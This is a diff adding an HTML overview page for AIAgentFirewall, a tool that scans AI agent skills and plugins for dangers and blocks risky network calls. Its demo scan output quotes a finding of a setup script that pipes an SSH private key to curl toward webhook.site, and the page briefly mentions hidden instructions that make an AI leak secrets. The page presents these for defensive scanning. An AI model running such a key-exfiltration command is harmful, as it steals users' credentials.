@@ -1,0 +1,318 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AIAgentFirewall — What is it?</title>
+<style>
+  :root{
+    --bg:#F4F7F7;--bg-2:#FFFFFF;--panel:#FBFDFD;--ink:#14202A;--ink-soft:#33424E;--muted:#5C6B76;
+    --line:#DBE4E6;--line-strong:#C4D1D3;--accent:#0C8A92;--accent-ink:#075056;--accent-tint:#E2F1F1;
+    --allow:#1E8A4C;--warn:#A9741A;--block:#BE3A32;--allow-tint:#E7F3EB;--warn-tint:#F6EEDD;--block-tint:#F7E9E8;
+    --shadow:0 1px 2px rgba(20,32,42,.06),0 10px 30px -14px rgba(20,32,42,.22);--grid:rgba(12,138,146,.09);
+    --font-sans:system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    --font-mono:ui-monospace,"SF Mono","JetBrains Mono","Cascadia Code",Menlo,Consolas,monospace;
+    --maxw:1080px;
+  }
+  @media (prefers-color-scheme:dark){:root{
+    --bg:#0A0F16;--bg-2:#121B24;--panel:#0F1720;--ink:#E7EEF3;--ink-soft:#C2CDD6;--muted:#8B99A6;
+    --line:#233039;--line-strong:#31414C;--accent:#34C7CD;--accent-ink:#8EE6E9;--accent-tint:#0F2429;
+    --allow:#48BB6B;--warn:#D3A03C;--block:#E56A61;--allow-tint:#112017;--warn-tint:#211B0F;--block-tint:#251615;
+    --shadow:0 1px 0 rgba(255,255,255,.02),0 20px 46px -22px rgba(0,0,0,.72);--grid:rgba(52,199,205,.08);
+  }}
+  :root[data-theme="light"]{--bg:#F4F7F7;--bg-2:#FFFFFF;--panel:#FBFDFD;--ink:#14202A;--ink-soft:#33424E;--muted:#5C6B76;--line:#DBE4E6;--line-strong:#C4D1D3;--accent:#0C8A92;--accent-ink:#075056;--accent-tint:#E2F1F1;--allow:#1E8A4C;--warn:#A9741A;--block:#BE3A32;--allow-tint:#E7F3EB;--warn-tint:#F6EEDD;--block-tint:#F7E9E8;--shadow:0 1px 2px rgba(20,32,42,.06),0 10px 30px -14px rgba(20,32,42,.22);--grid:rgba(12,138,146,.09);}
+  :root[data-theme="dark"]{--bg:#0A0F16;--bg-2:#121B24;--panel:#0F1720;--ink:#E7EEF3;--ink-soft:#C2CDD6;--muted:#8B99A6;--line:#233039;--line-strong:#31414C;--accent:#34C7CD;--accent-ink:#8EE6E9;--accent-tint:#0F2429;--allow:#48BB6B;--warn:#D3A03C;--block:#E56A61;--allow-tint:#112017;--warn-tint:#211B0F;--block-tint:#251615;--shadow:0 1px 0 rgba(255,255,255,.02),0 20px 46px -22px rgba(0,0,0,.72);--grid:rgba(52,199,205,.08);}
+
+  *{box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto}}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--font-sans);line-height:1.62;font-size:17px;-webkit-font-smoothing:antialiased}
+  .wrap{max-width:var(--maxw);margin:0 auto;padding:0 24px}
+  a{color:inherit}
+  svg{display:block}
+
+  /* topbar + layer switcher (shared across all three layers) */
+  .topbar{position:sticky;top:0;z-index:50;backdrop-filter:saturate(140%) blur(10px);background:color-mix(in srgb,var(--bg) 82%,transparent);border-bottom:1px solid var(--line)}
+  .topbar .wrap{display:flex;align-items:center;gap:16px;min-height:60px}
+  .brand{display:flex;align-items:center;gap:10px;font-weight:750;letter-spacing:-.01em;white-space:nowrap}
+  .brand .mark{width:22px;height:22px;flex:none;border-radius:6px;background:linear-gradient(150deg,var(--accent),color-mix(in srgb,var(--accent) 55%,var(--ink)));box-shadow:inset 0 0 0 1px color-mix(in srgb,var(--accent) 50%,transparent)}
+  .layers{margin-left:auto;display:inline-flex;border:1px solid var(--line);border-radius:10px;overflow:hidden;background:var(--bg-2)}
+  .layers a{padding:8px 13px;font-size:.8rem;font-weight:650;color:var(--muted);text-decoration:none;display:flex;gap:8px;align-items:center;border-right:1px solid var(--line);transition:color .15s,background .15s}
+  .layers a:last-child{border-right:0}
+  .layers a:hover{color:var(--ink)}
+  .layers a[aria-current="page"]{background:var(--accent-tint);color:var(--accent-ink)}
+  .layers a .ln{font-family:var(--font-mono);opacity:.65;font-size:.74rem}
+  .layers a:focus-visible{outline:2px solid var(--accent);outline-offset:-2px}
+  @media (max-width:680px){.layers a .lt{display:none}.layers a{padding:8px 11px}}
+
+  /* hero */
+  .hero{position:relative;overflow:hidden;border-bottom:1px solid var(--line)}
+  .hero::before{content:"";position:absolute;inset:0;pointer-events:none;background-image:linear-gradient(var(--grid) 1px,transparent 1px),linear-gradient(90deg,var(--grid) 1px,transparent 1px);background-size:36px 36px;-webkit-mask-image:radial-gradient(115% 85% at 82% -10%,#000,transparent 60%);mask-image:radial-gradient(115% 85% at 82% -10%,#000,transparent 60%)}
+  .hero .wrap{position:relative;padding:70px 24px 60px;display:grid;grid-template-columns:1.35fr 1fr;gap:44px;align-items:center}
+  @media (max-width:820px){.hero .wrap{grid-template-columns:1fr;gap:34px;padding:52px 24px 46px}}
+  .eyebrow{font-family:var(--font-mono);font-size:.74rem;letter-spacing:.15em;text-transform:uppercase;color:var(--accent-ink);font-weight:650;display:inline-flex;align-items:center;gap:9px}
+  .eyebrow::before{content:"";width:26px;height:1px;background:var(--accent)}
+  h1{font-size:clamp(2.4rem,5.6vw,3.7rem);line-height:1.02;letter-spacing:-.03em;font-weight:800;margin:.5em 0 .3em;text-wrap:balance}
+  h1 .hl{color:var(--accent)}
+  .sub{font-size:clamp(1.08rem,2.1vw,1.28rem);color:var(--ink-soft);max-width:42ch;margin:0}
+  .cta-row{display:flex;gap:12px;flex-wrap:wrap;margin-top:28px}
+  .btn{display:inline-flex;align-items:center;gap:9px;font-weight:650;font-size:.92rem;text-decoration:none;padding:11px 17px;border-radius:10px;border:1px solid var(--line);background:var(--bg-2);color:var(--ink);transition:transform .16s,border-color .16s}
+  .btn:hover{transform:translateY(-1px);border-color:var(--line-strong)}
+  .btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}
+  :root[data-theme="dark"] .btn.primary,@media (prefers-color-scheme:dark){.btn.primary{color:#04191b}}
+  .btn.primary:hover{filter:brightness(1.04)}
+  .btn:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+
+  /* traffic-light card */
+  .signal{background:var(--bg-2);border:1px solid var(--line);border-radius:18px;padding:22px;box-shadow:var(--shadow)}
+  .signal .cap{font-family:var(--font-mono);font-size:.72rem;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);font-weight:650;margin-bottom:14px}
+  .light{display:flex;align-items:center;gap:13px;padding:12px 14px;border-radius:12px;border:1px solid var(--line);margin-top:10px}
+  .light .dot{width:15px;height:15px;border-radius:50%;flex:none}
+  .light .lab{font-family:var(--font-mono);font-weight:700;font-size:.86rem;letter-spacing:.04em}
+  .light .txt{color:var(--muted);font-size:.86rem;margin-left:auto;text-align:right}
+  .light.a{background:var(--allow-tint)}.light.a .dot{background:var(--allow)}.light.a .lab{color:var(--allow)}
+  .light.w{background:var(--warn-tint)}.light.w .dot{background:var(--warn)}.light.w .lab{color:var(--warn)}
+  .light.b{background:var(--block-tint)}.light.b .dot{background:var(--block)}.light.b .lab{color:var(--block)}
+
+  section{padding:58px 0;border-top:1px solid var(--line)}
+  .sec-head{max-width:60ch}
+  .kicker{font-family:var(--font-mono);font-size:.74rem;letter-spacing:.14em;text-transform:uppercase;color:var(--accent-ink);font-weight:650}
+  .sec-head h2{font-size:clamp(1.6rem,3.2vw,2.15rem);letter-spacing:-.02em;font-weight:780;margin:.35em 0 .3em;text-wrap:balance}
+  .sec-head p{color:var(--muted);margin:0;font-size:1.05rem}
+
+  .grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;margin-top:30px}
+  @media (max-width:800px){.grid3{grid-template-columns:1fr}}
+  .tile{background:var(--bg-2);border:1px solid var(--line);border-radius:14px;padding:22px;box-shadow:var(--shadow)}
+  .tile .ic{width:40px;height:40px;border-radius:10px;display:flex;align-items:center;justify-content:center;background:var(--accent-tint);color:var(--accent-ink);margin-bottom:15px}
+  .tile .ic svg{width:22px;height:22px}
+  .tile h3{margin:0 0 7px;font-size:1.12rem;letter-spacing:-.01em;font-weight:730}
+  .tile p{margin:0;color:var(--ink-soft);font-size:.95rem}
+  .tile .an{display:block;margin-top:11px;font-size:.86rem;color:var(--muted);font-style:italic}
+
+  /* how it works steps */
+  .steps{display:grid;grid-template-columns:repeat(3,1fr);gap:0;margin-top:30px;border:1px solid var(--line);border-radius:14px;overflow:hidden;background:var(--line)}
+  @media (max-width:800px){.steps{grid-template-columns:1fr}}
+  .step{background:var(--bg-2);padding:24px 22px}
+  .step .no{font-family:var(--font-mono);font-size:.8rem;font-weight:700;color:var(--accent-ink)}
+  .step h3{margin:8px 0 6px;font-size:1.06rem;font-weight:720}
+  .step p{margin:0;color:var(--ink-soft);font-size:.92rem}
+
+  /* terminal demo */
+  .demo{margin-top:30px;border:1px solid var(--line);border-radius:14px;overflow:hidden;box-shadow:var(--shadow);background:var(--panel)}
+  .demo .bar{display:flex;align-items:center;gap:7px;padding:11px 15px;border-bottom:1px solid var(--line);background:var(--bg-2)}
+  .demo .bar i{width:11px;height:11px;border-radius:50%;background:var(--line-strong);display:block}
+  .demo .bar .ttl{margin-left:8px;font-family:var(--font-mono);font-size:.76rem;color:var(--muted)}
+  .demo pre{margin:0;padding:20px;font-family:var(--font-mono);font-size:.84rem;line-height:1.7;overflow-x:auto;color:var(--ink-soft)}
+  .demo pre .p{color:var(--accent-ink)}
+  .demo pre .b{color:var(--block);font-weight:700}
+  .demo pre .a{color:var(--allow);font-weight:700}
+  .demo pre .d{color:var(--muted)}
+  .demo .cap{padding:13px 18px;border-top:1px solid var(--line);color:var(--muted);font-size:.9rem;background:var(--bg-2)}
+
+  .trust{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-top:28px}
+  @media (max-width:800px){.trust{grid-template-columns:1fr 1fr}}
+  .trust .t{background:var(--bg-2);border:1px solid var(--line);border-radius:12px;padding:16px 16px}
+  .trust .t .ic{color:var(--accent-ink);margin-bottom:9px}.trust .t .ic svg{width:20px;height:20px}
+  .trust .t b{display:block;font-size:.98rem;margin-bottom:2px}
+  .trust .t span{color:var(--muted);font-size:.86rem}
+
+  .next{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:30px}
+  @media (max-width:680px){.next{grid-template-columns:1fr}}
+  .nextcard{display:flex;flex-direction:column;gap:6px;text-decoration:none;border:1px solid var(--line);border-radius:14px;padding:22px;background:var(--bg-2);box-shadow:var(--shadow);transition:transform .16s,border-color .16s}
+  .nextcard:hover{transform:translateY(-2px);border-color:var(--accent)}
+  .nextcard .ly{font-family:var(--font-mono);font-size:.72rem;letter-spacing:.1em;text-transform:uppercase;color:var(--accent-ink);font-weight:650}
+  .nextcard h3{margin:2px 0 0;font-size:1.15rem;font-weight:740}
+  .nextcard p{margin:0;color:var(--ink-soft);font-size:.92rem}
+  .nextcard .go{margin-top:6px;color:var(--accent-ink);font-weight:650;font-size:.9rem;display:inline-flex;gap:6px;align-items:center}
+
+  footer{border-top:1px solid var(--line);padding:34px 0 48px;color:var(--muted)}
+  footer .wrap{display:flex;flex-wrap:wrap;gap:16px;align-items:center;justify-content:space-between}
+  .foot-meta{display:flex;gap:14px;flex-wrap:wrap;align-items:center;font-size:.85rem}
+  .foot-meta code{font-family:var(--font-mono);background:var(--bg-2);border:1px solid var(--line);border-radius:6px;padding:3px 8px;color:var(--ink-soft)}
+  .foot-meta a{color:var(--accent-ink);text-decoration:none;font-weight:600}
+  .foot-meta a:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+
+  <div class="topbar">
+    <div class="wrap">
+      <span class="brand"><span class="mark" aria-hidden="true"></span> AIAgentFirewall</span>
+      <nav class="layers" aria-label="Documentation layers">
+        <a href="index.html" aria-current="page"><span class="ln">01</span><span class="lt">Overview</span></a>
+        <a href="features.html"><span class="ln">02</span><span class="lt">Features</span></a>
+        <a href="reference.html"><span class="ln">03</span><span class="lt">Reference</span></a>
+      </nav>
+    </div>
+  </div>
+
+  <header class="hero">
+    <div class="wrap">
+      <div>
+        <span class="eyebrow">Start here · plain english</span>
+        <h1>A safety check for the <span class="hl">AI helpers</span> you install.</h1>
+        <p class="sub">You download little AI add-ons — agents, skills, plugins — made by people you've never met. AIAgentFirewall looks them over <b>before</b> they run, keeps an eye on them <b>while</b> they run, and gives you a clear answer: safe, careful, or stop.</p>
+        <div class="cta-row">
+          <a class="btn primary" href="features.html">See what it does →</a>
+          <a class="btn" href="https://pypi.org/project/AIAgentFirewall/">Get it on PyPI</a>
+        </div>
+      </div>
+      <div class="signal" aria-label="How it answers">
+        <div class="cap">Every check ends in one clear answer</div>
+        <div class="light a"><span class="dot"></span><span class="lab">ALLOW</span><span class="txt">looks clean — go ahead</span></div>
+        <div class="light w"><span class="dot"></span><span class="lab">WARN</span><span class="txt">take a look first</span></div>
+        <div class="light b"><span class="dot"></span><span class="lab">BLOCK</span><span class="txt">don't install this</span></div>
+      </div>
+    </div>
+  </header>
+
+  <!-- THE PROBLEM -->
+  <section>
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="kicker">Why this exists</span>
+        <h2>Installing an AI helper means trusting a stranger's code.</h2>
+        <p>It's a bit like downloading a browser extension or an app — most are fine, but you can't tell the harmful ones apart just by looking.</p>
+      </div>
+      <div class="grid3">
+        <div class="tile">
+          <div class="ic" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l8 4v5c0 5-3.5 8-8 9-4.5-1-8-4-8-9V7z"/><path d="M9.5 12.5l1.8 1.8 3.5-3.8"/></svg></div>
+          <h3>You don't know who made it</h3>
+          <p>Skills and MCP servers get shared like npm packages. Anyone can publish one.</p>
+        </div>
+        <div class="tile">
+          <div class="ic" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/></svg></div>
+          <h3>Harm can hide in plain text</h3>
+          <p>A single file can quietly read your passwords, or hide instructions that tell your AI to leak secrets.</p>
+        </div>
+        <div class="tile">
+          <div class="ic" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M4 5h16M4 12h16M4 19h10"/><path d="M17 17l4 4M21 17l-4 4"/></svg></div>
+          <h3>You can't read it all</h3>
+          <p>Nobody reviews every line of every add-on. So the risky ones slip through.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- WHAT IT DOES -->
+  <section>
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="kicker">What it does</span>
+        <h2>Three simple jobs — like a firewall for your AI.</h2>
+        <p>You don't need to understand the internals. Here's the whole idea in three cards.</p>
+      </div>
+      <div class="grid3">
+        <div class="tile">
+          <div class="ic" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M9 11l3 3 8-8"/><path d="M20 12v6a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h9"/></svg></div>
+          <h3>1 · Checks before you install</h3>
+          <p>Point it at a folder or file and it inspects the code and hidden text without ever running it.</p>
+          <span class="an">Like a scanner at airport security.</span>
+        </div>
+        <div class="tile">
+          <div class="ic" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l8 4v5c0 5-3.5 8-8 9-4.5-1-8-4-8-9V7z"/><circle cx="12" cy="11" r="2.3"/><path d="M12 13.3V16"/></svg></div>
+          <h3>2 · Guards it while it runs</h3>
+          <p>If you do run something risky, it can block it from phoning out — or cut off the internet entirely.</p>
+          <span class="an">Like a one-way gate that only opens where you allow.</span>
+        </div>
+        <div class="tile">
+          <div class="ic" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg></div>
+          <h3>3 · Protects apps you build</h3>
+          <p>Building your own AI chatbot? It stops users from tricking it into running code or burning your credits.</p>
+          <span class="an">Like a lock on the features that cost you money.</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- HOW IT FEELS -->
+  <section>
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="kicker">How you use it</span>
+        <h2>One command. One clear verdict.</h2>
+        <p>No account, no setup, no cloud. You run it, it tells you what it found in words anyone can read.</p>
+      </div>
+
+      <div class="steps">
+        <div class="step"><div class="no">STEP 1</div><h3>Point it at the thing</h3><p>A downloaded skill, an agent folder, or a zip file.</p></div>
+        <div class="step"><div class="no">STEP 2</div><h3>It inspects</h3><p>Reads the files and the AI-facing text, looking for known tricks and dangers.</p></div>
+        <div class="step"><div class="no">STEP 3</div><h3>You get an answer</h3><p>A plain report and a verdict — allow, warn, or block — plus exactly why.</p></div>
+      </div>
+
+      <div class="demo" aria-label="Example scan">
+        <div class="bar"><i></i><i></i><i></i><span class="ttl">afw scan ./super-helper</span></div>
+<pre><span class="d">$</span> <span class="p">afw scan</span> ./super-helper
+
+  artifact : super-helper  (skill)
+  findings : <span class="b">CRITICAL:4</span>  HIGH:14  MEDIUM:1
+
+  <span class="b">CRITICAL</span>  Reads SSH private keys        <span class="d">[AFW-SEC-001]</span>
+           <span class="d">→ setup.sh:7  cat ~/.ssh/id_rsa | curl ...webhook.site</span>
+
+  <span class="b">✗ VERDICT: BLOCK</span>  — this should not be installed.
+
+<span class="d"># the safe one instead:</span>
+<span class="d">$</span> <span class="p">afw scan</span> ./trusted-skill
+  <span class="a">✓ VERDICT: ALLOW</span>  — nothing worrying found.</pre>
+        <div class="cap">The report names the danger, shows the exact line, and links it to a known risk — so you're never guessing.</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- WHY TRUST IT -->
+  <section>
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="kicker">Why you can trust it</span>
+        <h2>It runs entirely on your computer.</h2>
+        <p>The thing that checks your trust shouldn't ask for any.</p>
+      </div>
+      <div class="trust">
+        <div class="t"><div class="ic" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg></div><b>Stays local</b><span>Nothing is uploaded or sent anywhere.</span></div>
+        <div class="t"><div class="ic" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div><b>No account</b><span>No API keys, no sign-up, no telemetry.</span></div>
+        <div class="t"><div class="ic" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg></div><b>Zero setup</b><span>No extra dependencies to install.</span></div>
+        <div class="t"><div class="ic" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M8 3H5a2 2 0 0 0-2 2v3M16 3h3a2 2 0 0 1 2 2v3M8 21H5a2 2 0 0 1-2-2v-3M16 21h3a2 2 0 0 0 2-2v-3"/></svg></div><b>Open source</b><span>Free, MIT-licensed, readable by anyone.</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- NEXT LAYERS -->
+  <section>
+    <div class="wrap">
+      <div class="sec-head">
+        <span class="kicker">Go deeper when you're ready</span>
+        <h2>This page is Layer 1. There are two more.</h2>
+        <p>Start simple here; drill into detail only if you want it.</p>
+      </div>
+      <div class="next">
+        <a class="nextcard" href="features.html">
+          <span class="ly">Layer 02 · Features</span>
+          <h3>The feature guide</h3>
+          <p>Every capability explained — why it's needed, real use cases, and honest pros and cons.</p>
+          <span class="go">Open the guide →</span>
+        </a>
+        <a class="nextcard" href="reference.html">
+          <span class="ly">Layer 03 · Reference</span>
+          <h3>The full reference</h3>
+          <p>Architecture, every command and flag, the complete 59-detection catalogue, and framework mappings.</p>
+          <span class="go">Open the reference →</span>
+        </a>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="wrap">
+      <span class="brand"><span class="mark" aria-hidden="true"></span> AIAgentFirewall</span>
+      <div class="foot-meta">
+        <span><code>pip install AIAgentFirewall</code></span>
+        <a href="https://pypi.org/project/AIAgentFirewall/">PyPI</a>
+        <a href="https://github.com/mmedabo/agentfirewall">GitHub</a>
+        <span>MIT · v1.3.1</span>
+      </div>
+    </div>
+  </footer>
+
+</body>
+</html>
